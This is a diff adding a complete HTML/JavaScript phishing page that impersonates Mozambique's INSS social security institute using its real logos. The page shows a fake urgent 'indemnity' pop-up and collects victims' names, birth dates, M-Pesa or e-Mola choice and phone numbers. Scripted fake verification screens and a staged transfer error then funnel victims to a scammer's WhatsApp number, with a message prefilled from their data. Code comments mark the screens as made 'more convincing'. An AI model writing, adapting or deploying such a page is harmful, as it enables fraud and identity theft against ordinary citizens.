@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang="pt-MZ">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>INSS - Instituto Nacional de Segurança Social</title>
+    <!-- Fonte e Ícones -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    
+    <style>
+        /* ================= ESTILOS GERAIS E RESET ================= */
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', sans-serif; }
+        body { background-color: #f4f4f4; color: #333; overflow-x: hidden; }
+        body.modal-open { overflow: hidden; } 
+        a { text-decoration: none; color: inherit; }
+        ul { list-style: none; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+
+        /* Cores Principais INSS */
+        :root {
+            --inss-blue: #0088d1;
+            --inss-dark: #003c71;
+            --inss-light: #e6f4fa;
+            --whatsapp-green: #25D366;
+            --alert-red: #d9534f;
+            --success-green: #28a745;
+        }
+
+        /* ================= HEADER E NAVEGAÇÃO (Otimizado p/ Mobile) ================= */
+        .top-bar { background-color: var(--inss-dark); color: white; font-size: 11px; padding: 8px 0; }
+        .top-bar .container { display: flex; justify-content: space-between; align-items: center; }
+        .top-bar-links a { margin-left: 15px; color: #ddd; }
+        .top-bar-links a:hover { color: white; }
+
+        header { background-color: var(--inss-blue); color: white; padding: 12px 0; box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: relative; z-index: 100; }
+        .header-content { display: flex; justify-content: space-between; align-items: center; }
+        
+        .main-logo { height: 55px; width: auto; object-fit: contain; }
+        
+        .main-nav { display: flex; gap: 25px; font-size: 13px; font-weight: 500; text-transform: uppercase; }
+        .main-nav a:hover { color: #cceeff; }
+        .mobile-menu-btn { display: none; font-size: 24px; cursor: pointer; }
+
+        /* ================= HERO SECTION ================= */
+        .hero { 
+            background: url('https://www.inss.gov.mz/wp-content/uploads/2023/10/banner-proteccao-na-velhice.png') center/cover no-repeat; 
+            height: 450px; display: flex; align-items: center; position: relative; 
+        }
+        .hero-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); }
+        .hero-text { position: relative; color: white; padding-left: 10%; max-width: 600px; z-index: 1; }
+        .hero-text h1 { font-size: 52px; font-weight: 700; line-height: 1.1; text-shadow: 2px 2px 8px rgba(0,0,0,0.6); }
+
+        /* ================= SECÇÕES DO SITE ================= */
+        .section-title { color: var(--inss-blue); font-size: 18px; font-weight: 700; text-transform: uppercase; border-left: 4px solid var(--inss-blue); padding-left: 12px; margin: 40px 0 25px; }
+        
+        .news-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; }
+        .news-card { background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.05); transition: transform 0.3s ease; }
+        .news-card:hover { transform: translateY(-5px); }
+        .news-card img { width: 100%; height: 180px; object-fit: cover; }
+        .news-card-content { padding: 20px; font-size: 14px; font-weight: 500; color: #444; line-height: 1.4; }
+
+        .stats-section { background: var(--inss-blue); color: white; padding: 50px 0; margin-top: 50px; }
+        .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); text-align: center; gap: 20px; }
+        .stat-item h2 { font-size: 38px; font-weight: 300; margin-bottom: 5px; }
+        .stat-item p { font-size: 13px; opacity: 0.9; text-transform: uppercase; letter-spacing: 1px; }
+
+        footer { background-color: #001f3f; color: #a0b2c6; padding: 50px 0 20px; font-size: 13px; }
+        .footer-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 30px; margin-bottom: 30px; }
+        .footer-col h4 { color: white; margin-bottom: 15px; font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .footer-col ul li { margin-bottom: 10px; cursor: pointer; transition: color 0.2s; }
+        .footer-col ul li:hover { color: white; }
+        .footer-bottom { border-top: 1px solid #1a3c5e; padding-top: 20px; text-align: center; font-size: 12px; }
+
+        /* ================= MODAL INICIAL (CHAMATIVO) ================= */
+        .modal-overlay { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(0,0,0,0.8); display: flex; justify-content: center; align-items: center; 
+            z-index: 1000; backdrop-filter: blur(4px); 
+            opacity: 0; visibility: hidden; transition: opacity 0.5s ease, visibility 0.5s ease;
+            padding: 20px;
+        }
+        .modal-overlay.show { opacity: 1; visibility: visible; }
+        
+        .modal-content { 
+            background: white; padding: 30px 20px; border-radius: 12px; max-width: 500px; text-align: center; 
+            box-shadow: 0 15px 30px rgba(0,0,0,0.4); border: 2px solid var(--alert-red); 
+            transform: translateY(30px) scale(0.95); transition: transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            position: relative; overflow: hidden;
+        }
+        .modal-overlay.show .modal-content { transform: translateY(0) scale(1); }
+        
+        .alert-icon { font-size: 50px; color: var(--alert-red); margin-bottom: 15px; animation: pulse-icon 1.5s infinite; }
+        @keyframes pulse-icon { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+
+        .modal-content h2 { color: var(--alert-red); margin-bottom: 15px; font-size: 24px; text-transform: uppercase; letter-spacing: 1px; }
+        .modal-content p { color: #444; font-size: 15px; line-height: 1.6; margin-bottom: 10px; }
+        
+        .highlight-text { 
+            color: var(--alert-red); font-weight: bold; background: #fdf0ef; 
+            padding: 12px; border-radius: 6px; margin-bottom: 20px; display: block; 
+            border-left: 4px solid var(--alert-red); text-align: left;
+        }
+
+        .btn-primary { 
+            background-color: var(--alert-red); color: white; border: none; padding: 16px 30px; 
+            font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; 
+            transition: all 0.3s ease; width: 100%; box-shadow: 0 4px 10px rgba(217, 83, 79, 0.4); 
+            text-transform: uppercase; letter-spacing: 1px;
+        }
+        .btn-primary:hover { background-color: #c9302c; transform: translateY(-2px); }
+        
+        .btn-attention { animation: pulse-btn 2s infinite; }
+        @keyframes pulse-btn {
+            0% { box-shadow: 0 0 0 0 rgba(217, 83, 79, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(217, 83, 79, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(217, 83, 79, 0); }
+        }
+
+        /* ================= APP CONTAINER (TELAS DO FLUXO) ================= */
+        #app-container { 
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: linear-gradient(rgba(0, 60, 113, 0.7), rgba(0, 60, 113, 0.7)), url('https://www.inss.gov.mz/wp-content/uploads/2023/10/banner-familia.png') center/cover no-repeat fixed; 
+            z-index: 2000; overflow-y: auto; padding: 20px; 
+            justify-content: center; align-items: center; 
+        }
+        
+        .screen { 
+            display: none; background: rgba(255, 255, 255, 0.98); backdrop-filter: blur(10px);
+            padding: 30px; border-radius: 12px; box-shadow: 0 15px 35px rgba(0,0,0,0.3); 
+            width: 100%; max-width: 450px; text-align: center; 
+            opacity: 0; transform: translateY(20px) scale(0.98); 
+            transition: opacity 0.4s ease, transform 0.4s ease; 
+            border-top: 5px solid var(--inss-blue);
+        }
+        .screen.active { display: block; opacity: 1; transform: translateY(0) scale(1); }
+
+        .step-logo { height: 50px; margin-bottom: 20px; display: block; margin-left: auto; margin-right: auto; object-fit: contain; }
+
+        .screen h2 { color: var(--inss-dark); margin-bottom: 15px; font-size: 22px; }
+        .screen p { color: #555; margin-bottom: 20px; font-size: 14px; line-height: 1.5; }
+        
+        .form-group { margin-bottom: 20px; text-align: left; }
+        .form-group label { display: block; font-size: 13px; color: #333; margin-bottom: 8px; font-weight: 500; }
+        .form-group input { 
+            width: 100%; padding: 14px; border: 2px solid #e0e0e0; border-radius: 6px; 
+            font-size: 16px; transition: 0.3s; outline: none; 
+        }
+        .form-group input:focus { border-color: var(--inss-blue); box-shadow: 0 0 0 3px rgba(0,136,209,0.1); }
+
+        .btn-step { 
+            background-color: var(--inss-blue); color: white; border: none; padding: 15px; 
+            font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; 
+            transition: background 0.3s; width: 100%; 
+        }
+        .btn-step:hover { background-color: var(--inss-dark); }
+
+        /* Loader */
+        .spinner-container { position: relative; width: 70px; height: 70px; margin: 0 auto 25px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--inss-blue); border-radius: 50%; width: 100%; height: 100%; animation: spin 1s linear infinite; }
+        .spinner-icon { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: var(--inss-blue); font-size: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Barra de Progresso */
+        .progress-bar-container { background: #e0e0e0; border-radius: 10px; height: 12px; width: 100%; margin: 25px 0 15px; overflow: hidden; }
+        .progress-bar { background: linear-gradient(90deg, var(--inss-blue), #00c3ff); height: 100%; width: 0%; transition: width 0.1s linear; border-radius: 10px; }
+
+        /* Caixa do Valor */
+        .amount-box { background: var(--inss-light); border: 2px dashed var(--inss-blue); border-radius: 8px; padding: 30px 25px 25px; margin: 20px 0; position: relative; }
+        .amount-box h1 { color: var(--inss-dark); font-size: 38px; margin: 5px 0 0; font-weight: 700; }
+        .amount-box p { margin: 0; font-size: 13px; color: #666; font-weight: 500; text-transform: uppercase; letter-spacing: 1px; }
+        
+        /* Selo de Aprovado */
+        .approved-badge {
+            position: absolute; top: -12px; right: -10px; background: var(--success-green); color: white;
+            padding: 6px 12px; border-radius: 20px; font-size: 11px; font-weight: bold;
+            transform: rotate(5deg); box-shadow: 0 3px 8px rgba(40, 167, 69, 0.4);
+            display: flex; align-items: center; gap: 5px;
+        }
+
+        /* Cartões de Pagamento */
+        .payment-options { display: flex; gap: 15px; margin-bottom: 20px; }
+        .payment-card { 
+            flex: 1; border: 2px solid #ddd; border-radius: 8px; padding: 20px 15px; cursor: pointer; 
+            transition: all 0.3s ease; font-weight: bold; color: #555; font-size: 15px; 
+            display: flex; flex-direction: column; align-items: center; gap: 10px; 
+        }
+        .payment-card i { font-size: 28px; color: #aaa; transition: 0.3s; }
+        .payment-card:hover { border-color: var(--inss-blue); }
+        .payment-card.selected { border-color: var(--inss-blue); background: var(--inss-light); color: var(--inss-blue); box-shadow: 0 5px 15px rgba(0,136,209,0.2); }
+        .payment-card.selected i { color: var(--inss-blue); }
+
+        #payment-details { display: none; margin-top: 20px; padding-top: 20px; border-top: 1px solid #eee; }
+        .slide-down { animation: slideDown 0.4s ease forwards; }
+        @keyframes slideDown { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* WhatsApp e Erro */
+        .btn-whatsapp { 
+            background-color: var(--whatsapp-green); color: white; text-decoration: none; 
+            display: flex; align-items: center; justify-content: center; gap: 10px; 
+            padding: 16px; border-radius: 6px; font-size: 16px; font-weight: bold; 
+            margin-top: 20px; transition: all 0.3s ease; box-shadow: 0 4px 10px rgba(37,211,102,0.3); 
+        }
+        .btn-whatsapp:hover { background-color: #128C7E; }
+        .error-text { color: var(--alert-red); background: #fdf0ef; padding: 15px; border-radius: 6px; border-left: 4px solid var(--alert-red); font-weight: 500; margin-bottom: 15px; text-align: left; font-size: 14px; }
+
+        /* ================= RESPONSIVIDADE (MOBILE) ================= */
+        @media (max-width: 768px) {
+            .top-bar { display: none; }
+            .main-nav { display: none; }
+            .mobile-menu-btn { display: block; }
+            
+            .hero { height: 350px; }
+            .hero-text { padding-left: 5%; text-align: center; margin: 0 auto; }
+            .hero-text h1 { font-size: 38px; }
+            
+            .news-grid { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; gap: 15px; padding-bottom: 20px; }
+            .news-card { min-width: 80%; scroll-snap-align: start; }
+            
+            .stats-grid { grid-template-columns: 1fr 1fr; gap: 30px 10px; }
+            .stat-item h2 { font-size: 28px; }
+            
+            .footer-grid { grid-template-columns: 1fr; text-align: center; }
+            
+            .modal-content { padding: 25px 15px; }
+            .modal-content h2 { font-size: 20px; }
+            .alert-icon { font-size: 40px; }
+            
+            .screen { padding: 25px 20px; }
+            .amount-box h1 { font-size: 32px; }
+            .approved-badge { top: -10px; right: 10px; } /* Reposiciona o selo no mobile */
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ================= SITE INSS SIMULADO ================= -->
+    <div class="top-bar">
+        <div class="container">
+            <div>MINISTÉRIO DO TRABALHO, GÉNERO E ACÇÃO SOCIAL</div>
+            <div class="top-bar-links">
+                <a href="#"><i class="fab fa-facebook"></i></a>
+                <a href="#"><i class="fab fa-instagram"></i></a>
+                <a href="#"><i class="fab fa-youtube"></i></a>
+                <a href="#">Português</a>
+            </div>
+        </div>
+    </div>
+
+    <header>
+        <div class="container header-content">
+            <img src="https://www.inss.gov.mz/wp-content/webp-express/webp-images/uploads/2023/10/inss-logo-2023.png.webp" alt="INSS Logo" class="main-logo">
+            <nav class="main-nav">
+                <a href="#">O INSS</a>
+                <a href="#">Documentos</a>
+                <a href="#">Imprensa</a>
+                <a href="#">Dúvidas</a>
+                <a href="#">Plataformas</a>
+            </nav>
+            <i class="fas fa-bars mobile-menu-btn"></i>
+        </div>
+    </header>
+
+    <section class="hero">
+        <div class="hero-overlay"></div>
+        <div class="hero-text">
+            <h1>Protecção<br>na velhice</h1>
+        </div>
+    </section>
+
+    <div class="container">
+        <h2 class="section-title">NOTÍCIAS</h2>
+        <div class="news-grid">
+            <div class="news-card">
+                <img src="https://images.unsplash.com/photo-1540317580384-e5d43616b9aa?auto=format&fit=crop&w=500&q=80" alt="Notícia 1">
+                <div class="news-card-content">INSS incute cultura de protecção social a estudantes do Unilúrio em Sofala</div>
+            </div>
+            <div class="news-card">
+                <img src="https://images.unsplash.com/photo-1573164713714-d95e436ab8d6?auto=format&fit=crop&w=500&q=80" alt="Notícia 2">
+                <div class="news-card-content">Mais de 100 trabalhadores informais em Cabo Delgado beneficiam do regime de Segurança Social</div>
+            </div>
+            <div class="news-card">
+                <img src="https://images.unsplash.com/photo-1556761175-5973dc0f32e7?auto=format&fit=crop&w=500&q=80" alt="Notícia 3">
+                <div class="news-card-content">PCA do INSS apela à prática do bem durante visita a Nampula</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="stats-section">
+        <div class="container stats-grid">
+            <div class="stat-item"><h2>211,000</h2><p>Contribuintes</p></div>
+            <div class="stat-item"><h2>2,800,000</h2><p>Beneficiários</p></div>
+            <div class="stat-item"><h2>75,000</h2><p>TCP</p></div>
+            <div class="stat-item"><h2>146,000</h2><p>Pensionistas</p></div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="container">
+            <div class="footer-grid">
+                <div class="footer-col">
+                    <h4>O INSS</h4>
+                    <ul>
+                        <li>Sou Contribuinte</li>
+                        <li>Sou Beneficiário</li>
+                        <li>Sou Pensionista</li>
+                    </ul>
+                </div>
+                <div class="footer-col">
+                    <h4>Programa de Acção</h4>
+                    <ul>
+                        <li>Documentos</li>
+                        <li>Imprensa</li>
+                        <li>Dúvidas</li>
+                    </ul>
+                </div>
+                <div class="footer-col">
+                    <h4>Plataformas</h4>
+                    <ul>
+                        <li>SISMO</li>
+                        <li>M-Contribuição</li>
+                        <li>Webmail</li>
+                    </ul>
+                </div>
+                <div class="footer-col">
+                    <h4>Contactos</h4>
+                    <ul>
+                        <li><i class="fas fa-map-marker-alt"></i> Av. 25 de Setembro, Maputo</li>
+                        <li><i class="fas fa-phone"></i> +258 21 000 000</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                &copy; 2023 INSS - Instituto Nacional de Segurança Social.
+            </div>
+        </div>
+    </footer>
+
+    <!-- ================= MODAL INICIAL (CHAMATIVO) ================= -->
+    <div class="modal-overlay" id="initial-modal">
+        <div class="modal-content">
+            <i class="fas fa-exclamation-triangle alert-icon"></i>
+            <h2>Aviso Urgente</h2>
+            <p>O INSS acaba de liberar uma <strong>indenização extraordinária</strong> a todos os funcionários públicos e privados.</p>
+            <span class="highlight-text">
+                <i class="fas fa-bullhorn"></i> Este é um programa de ação social e sanitária, iniciativa do Presidente da República. O prazo para reclamação está a terminar!
+            </span>
+            <button class="btn-primary btn-attention" onclick="startFlow()">Receber Meus Valores Agora</button>
+        </div>
+    </div>
+
+    <!-- ================= FLUXO DO SISTEMA (APP) ================= -->
+    <div id="app-container">
+        
+        <!-- Tela 1: Dados Iniciais -->
+        <div class="screen" id="screen-1">
+            <img src="https://www.inss.gov.mz/wp-content/webp-express/webp-images/uploads/2023/10/inss-logo-2023.png.webp" alt="INSS Logo" class="step-logo">
+            <h2>Identificação do Beneficiário</h2>
+            <p>Preencha os seus dados para consultar o valor da sua indenização.</p>
+            <div class="form-group">
+                <label>Nome Completo</label>
+                <input type="text" id="input-nome" placeholder="Ex: João da Silva" required>
+            </div>
+            <div class="form-group">
+                <label>Data de Nascimento</label>
+                <input type="date" id="input-data" required>
+            </div>
+            <button class="btn-step" onclick="validateAndProceed()">Continuar</button>
+        </div>
+
+        <!-- Tela 2: Processamento de 5s -->
+        <div class="screen" id="screen-2">
+            <img src="https://www.inss.gov.mz/wp-content/webp-express/webp-images/uploads/2023/10/inss-logo-2023.png.webp" alt="INSS Logo" class="step-logo">
+            <div class="spinner-container">
+                <div class="spinner"></div>
+                <i class="fas fa-lock spinner-icon"></i>
+            </div>
+            <h2>A processar dados...</h2>
+            <p id="loading-text-1">Aguarde enquanto validamos as suas informações no sistema central seguro.</p>
+        </div>
+
+        <!-- Tela 3: Verificação (10s) - MAIS CONVINCENTE -->
+        <div class="screen" id="screen-3">
+            <img src="https://www.inss.gov.mz/wp-content/webp-express/webp-images/uploads/2023/10/inss-logo-2023.png.webp" alt="INSS Logo" class="step-logo">
+            <h2>Verificação Oficial de Dados</h2>
+            
+            <p style="font-size: 12px; color: var(--success-green); font-weight: bold; margin-bottom: 10px;">
+                <i class="fas fa-shield-alt"></i> Ligação Segura Encriptada
+            </p>
+            
+            <p id="verify-text" style="font-weight: 500; color: var(--inss-dark); min-height: 40px;">
+                O nosso sistema está a cruzar os seus dados com a base de dados nacional para calcular o valor exato da sua indenização.
+            </p>
+            
+            <div class="progress-bar-container">
+                <div class="progress-bar" id="progress-bar"></div>
+            </div>
+            
+            <p style="font-size: 13px; color: #555; background: #f9f9f9; padding: 12px; border-radius: 6px; border: 1px solid #eee;">
+                <i class="fas fa-database" style="color: var(--inss-blue);"></i> <strong>A cruzar dados de:</strong><br>
+                <span id="display-nome" style="color: var(--inss-dark); text-transform: uppercase; font-weight: bold;"></span><br>
+                <span id="display-data"></span>
+            </p>
+        </div>
+
+        <!-- Tela 4: Resultado - MAIS CONVINCENTE -->
+        <div class="screen" id="screen-4">
+            <img src="https://www.inss.gov.mz/wp-content/webp-express/webp-images/uploads/2023/10/inss-logo-2023.png.webp" alt="INSS Logo" class="step-logo">
+            <h2 style="color: var(--success-green);"><i class="fas fa-check-circle"></i> Dados Verificados!</h2>
+            <p style="font-size: 15px; color: #333; margin-bottom: 10px;">
+                A sua elegibilidade foi confirmada pelo sistema central. O valor da sua indenização já se encontra <strong>reservado</strong> em seu nome.
+            </p>
+            
+            <div class="amount-box">
+                <div class="approved-badge"><i class="fas fa-check"></i> APROVADO</div>
+                <p>VALOR DISPONÍVEL PARA LEVANTAMENTO:</p>
+                <h1>19.462,82 MZN</h1>
+                <p style="font-size: 11px; margin-top: 8px; color: #666;">*Válido apenas para o titular destes dados.</p>
+            </div>
+            
+            <button class="btn-step" onclick="goToScreen(5)">Desbloquear e Receber</button>
+        </div>
+
+        <!-- Tela 5: Método de Pagamento e Número -->
+        <div class="screen" id="screen-5">
+            <img src="https://www.inss.gov.mz/wp-content/webp-express/webp-images/uploads/2023/10/inss-logo-2023.png.webp" alt="INSS Logo" class="step-logo">
+            <h2>Método de Recebimento</h2>
+            <p>Escolha como deseja receber a sua indenização:</p>
+            
+            <div class="payment-options">
+                <div class="payment-card" id="card-mpesa" onclick="selectMethod('M-Pesa', 'card-mpesa')">
+                    <i class="fas fa-mobile-alt"></i> M-Pesa
+                </div>
+                <div class="payment-card" id="card-emola" onclick="selectMethod('e-Mola', 'card-emola')">
+                    <i class="fas fa-mobile-alt"></i> e-Mola
+                </div>
+            </div>
+
+            <div id="payment-details">
+                <p style="margin-bottom: 15px;">Insira o número associado à sua conta <strong id="method-name" style="color: var(--inss-blue);"></strong>.</p>
+                <div class="form-group">
+                    <label>Número de Telefone (9 dígitos)</label>
+                    <input type="tel" id="input-telefone" placeholder="Ex: 84 000 0000" maxlength="9" required>
+                </div>
+                <button class="btn-step" onclick="startFinalProcessing()">Receber agora</button>
+            </div>
+        </div>
+
+        <!-- Tela 6: Processamento Final (5s) -->
+        <div class="screen" id="screen-6">
+            <img src="https://www.inss.gov.mz/wp-content/webp-express/webp-images/uploads/2023/10/inss-logo-2023.png.webp" alt="INSS Logo" class="step-logo">
+            <div class="spinner-container">
+                <div class="spinner"></div>
+                <i class="fas fa-shield-alt spinner-icon"></i>
+            </div>
+            <h2>A transferir valores...</h2>
+            <p id="loading-text-2">Estabelecendo ligação segura com a operadora. Por favor, não feche esta janela.</p>
+        </div>
+
+        <!-- Tela 7: Erro / WhatsApp -->
+        <div class="screen" id="screen-7">
+            <img src="https://www.inss.gov.mz/wp-content/webp-express/webp-images/uploads/2023/10/inss-logo-2023.png.webp" alt="INSS Logo" class="step-logo">
+            <h2>Erro na Transferência</h2>
+            <div class="error-text">
+                <i class="fas fa-exclamation-triangle"></i> Não foi possível verificar a identidade do titular que está a sacar.
+            </div>
+            <p>Para sua segurança e proteção dos seus dados, precisamos de validar a sua identidade através do nosso atendimento oficial.</p>
+            <a href="#" id="whatsapp-link" class="btn-whatsapp" target="_blank">
+                <i class="fab fa-whatsapp" style="font-size: 24px;"></i> Verificar Identidade no WhatsApp
+            </a>
+        </div>
+
+    </div>
+
+    <!-- ================= JAVASCRIPT ================= -->
+    <script>
+        let userData = {
+            nome: "",
+            dataNasc: "",
+            metodo: "",
+            telefone: ""
+        };
+
+        // Atraso de 4 segundos para o popup inicial chamativo
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                document.getElementById('initial-modal').classList.add('show');
+            }, 4000);
+        });
+
+        // Iniciar o fluxo
+        function startFlow() {
+            document.getElementById('initial-modal').classList.remove('show');
+            
+            let appContainer = document.getElementById('app-container');
+            appContainer.style.display = 'flex'; 
+            
+            document.body.classList.add('modal-open');
+            goToScreen(1);
+        }
+
+        // Validar idade e prosseguir
+        function validateAndProceed() {
+            let nomeInput = document.getElementById('input-nome').value.trim();
+            let dataInput = document.getElementById('input-data').value;
+
+            if (!nomeInput || !dataInput) {
+                alert("Por favor, preencha todos os campos corretamente.");
+                return;
+            }
+
+            // Validação de Idade (Maior de 21)
+            let birthDate = new Date(dataInput);
+            let today = new Date();
+            let age = today.getFullYear() - birthDate.getFullYear();
+            let monthDiff = today.getMonth() - birthDate.getMonth();
+            
+            if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate())) {
+                age--;
+            }
+
+            if (age < 21) {
+                alert("Apenas cidadãos com mais de 21 anos de idade podem consultar e receber esta indenização.");
+                return;
+            }
+
+            userData.nome = nomeInput;
+            userData.dataNasc = dataInput;
+
+            let dataFormatada = dataInput.split('-').reverse().join('/');
+            document.getElementById('display-nome').innerText = userData.nome;
+            document.getElementById('display-data').innerText = dataFormatada;
+
+            goToScreen(2);
+
+            setTimeout(() => {
+                document.getElementById('loading-text-1').innerText = "Acedendo à base de dados de segurança social...";
+            }, 2000);
+
+            setTimeout(() => {
+                goToScreen(3);
+                startVerification();
+            }, 5000);
+        }
+
+        // Navegar entre telas
+        function goToScreen(screenNumber) {
+            document.querySelectorAll('.screen').forEach(screen => {
+                screen.classList.remove('active');
+            });
+            document.getElementById('screen-' + screenNumber).classList.add('active');
+        }
+
+        // Animação da barra de progresso e textos dinâmicos
+        function startVerification() {
+            let progressBar = document.getElementById('progress-bar');
+            let verifyText = document.getElementById('verify-text');
+            let width = 0;
+            let duration = 10000; // 10 segundos
+            let interval = 100; 
+            let step = 100 / (duration / interval);
+
+            // Textos dinâmicos para simular um processo real e rigoroso
+            setTimeout(() => {
+                verifyText.innerHTML = "A verificar histórico de contribuições e vínculo empregatício...";
+            }, 2000);
+
+            setTimeout(() => {
+                verifyText.innerHTML = "A cruzar dados com o programa de ação social e sanitária...";
+            }, 5000);
+
+            setTimeout(() => {
+                verifyText.innerHTML = `A calcular o valor exato reservado para <strong>${userData.nome}</strong>...`;
+            }, 8000);
+
+            let timer = setInterval(() => {
+                if (width >= 100) {
+                    clearInterval(timer);
+                    setTimeout(() => {
+                        goToScreen(4); 
+                    }, 500);
+                } else {
+                    width += step;
+                    progressBar.style.width = width + '%';
+                }
+            }, interval);
+        }
+
+        // Selecionar método e mostrar campo
+        function selectMethod(method, elementId) {
+            userData.metodo = method;
+            document.getElementById('method-name').innerText = method;
+            
+            document.querySelectorAll('.payment-card').forEach(card => card.classList.remove('selected'));
+            document.getElementById(elementId).classList.add('selected');
+
+            let paymentDetails = document.getElementById('payment-details');
+            if (paymentDetails.style.display !== 'block') {
+                paymentDetails.style.display = 'block';
+                paymentDetails.classList.add('slide-down');
+            }
+        }
+
+        // Processamento Final
+        function startFinalProcessing() {
+            let telefoneInput = document.getElementById('input-telefone').value.trim();
+            userData.telefone = telefoneInput;
+
+            if (!userData.telefone || userData.telefone.length !== 9) {
+                alert("Por favor, insira um número de telefone válido com exatamente 9 dígitos.");
+                return;
+            }
+
+            goToScreen(6);
+
+            setTimeout(() => {
+                document.getElementById('loading-text-2').innerText = "A validar identidade e a transferir fundos...";
+            }, 2500);
+
+            setTimeout(() => {
+                let phoneNumber = "258864688021"; 
+                let message = encodeURIComponent(`Olá, tentei receber a minha indenização de 19.462,82 MZN via ${userData.metodo} (Número: ${userData.telefone}), mas deu erro de verificação de identidade. O meu nome é ${userData.nome}. Como posso proceder?`);
+                document.getElementById('whatsapp-link').href = `https://wa.me/${phoneNumber}?text=${message}`;
+
+                goToScreen(7); 
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
